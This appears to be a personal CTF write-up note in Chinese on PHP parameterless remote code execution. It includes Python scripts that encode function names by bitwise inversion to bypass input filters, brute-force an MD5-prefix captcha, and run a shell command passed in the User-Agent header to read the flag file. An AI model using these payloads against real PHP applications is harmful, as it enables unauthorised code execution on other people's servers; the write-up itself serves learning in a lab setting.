tags:: [[CTFWEB/PHP/无参数RCE]]

- # 思路
	- 使用取反构造任意函数名，并使用[无参数注入]([[CTFWEB/PHP/无参数RCE]])进行RCE
- # 取反构造函数名
	- python脚本如下
	- ```python
	  def get_str(s):
	      return b"[~PAYLOAD][!\xFF]".replace(b"PAYLOAD", bytes(255 - ord(c) for c in s))
	  
	  def payload(lst):
	      if len(lst) == 0:
	          return b";"
	      return b"STRING(SUBPAYLOAD);".replace(b"STRING", get_str(lst[0])).replace(
	          b"SUBPAYLOAD",
	          payload(lst[1:]).replace(b";", b"")
	      )
	  
	  print(payload(["var_dump", "getallheaders"]))
	  ```
- # 利用无参数注入进行RCE
	- 使用`system(next(getallheaders()))`拿到UserAgent并传给`system`函数即可
	- ```python
	  @functools.lru_cache
	  def get_code(md5_head):
	      while True:
	          s = random_chars()
	          if enc_dec.md5_encode(s).startswith(md5_head):
	              return s
	  
	  r = base_get(url)
	  result = re.search(",0,5\)==(.{5})", r.text)
	  assert result is not None
	  captcha = result.group(1)
	  print(captcha)
	  
	  def get_str(s):
	      return b"[~PAYLOAD][!\xFF]".replace(b"PAYLOAD", bytes(255 - ord(c) for c in s))
	  
	  def payload(lst):
	      if len(lst) == 0:
	          return b";"
	      return b"STRING(SUBPAYLOAD);".replace(b"STRING", get_str(lst[0])).replace(
	          b"SUBPAYLOAD",
	          payload(lst[1:]).replace(b";", b"")
	      )
	  
	  r = base_post(url, data = {
	      "cmd": payload(["system", "next", "getallheaders"]),
	      # "code": "1145"
	      "code": get_code(captcha)
	  }, headers = {
	      "User-Agent": "cat /flll1114gggggg"
	  })
	  print(r.text)
	  ```